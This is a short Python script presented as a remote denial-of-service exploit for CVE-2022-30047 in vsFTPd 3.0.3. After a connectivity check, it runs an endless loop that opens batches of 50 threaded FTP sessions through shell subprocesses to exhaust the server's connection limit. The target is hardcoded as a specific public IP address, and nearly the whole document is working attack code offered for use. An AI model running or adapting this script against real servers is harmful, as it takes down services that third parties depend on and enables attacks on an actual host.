############### Simples Exploit for CVE-2022-30047 ###############
# The code takes advantage of the limited connections flaw of vsFTPd 3.0.3 by performing infinite sub-shells for FTP connection
# Thus performing a DOS and blocking new connections
# Category: RDOS(Remote Denial of Service)
# Author: 0xgrah4m

import socket, subprocess, threading, sys

target = "103.64.134.191"
port = 21
number_of_threads = 50

def attack_ftp():
    try:
        subprocess.Popen(f"ftp {target} {port}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except OSError as err:
        print(f"[!] Error in FTP connection: {err}")

def check_and_loop():
    print("[*] Checking FTP connection")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(12)
    try:
        sock.connect((target, port))
        sock.recv(65535)
        sock.close()
        print(f"[*] {target} connection is valid")
    except socket.error as err:
        print(f"[!] Connection error: {err}")
        sys.exit()

    print("[*] Attack started\n")
    ##### LOOP #####
    while (True):
        try:
            for t in range(number_of_threads):
                try:
                    thd = threading.Thread(target=attack_ftp)
                    thd.start()
                    print(f"[*] Thread {t} started..")
                except Exception as err:
                    print(f"[!] Error to initialized Thread({t}):  {err}")
        except KeyboardInterrupt:
            subprocess.Popen("pkill ftp", shell=True)
            break

if __name__ == "__main__":
    check_and_loop()
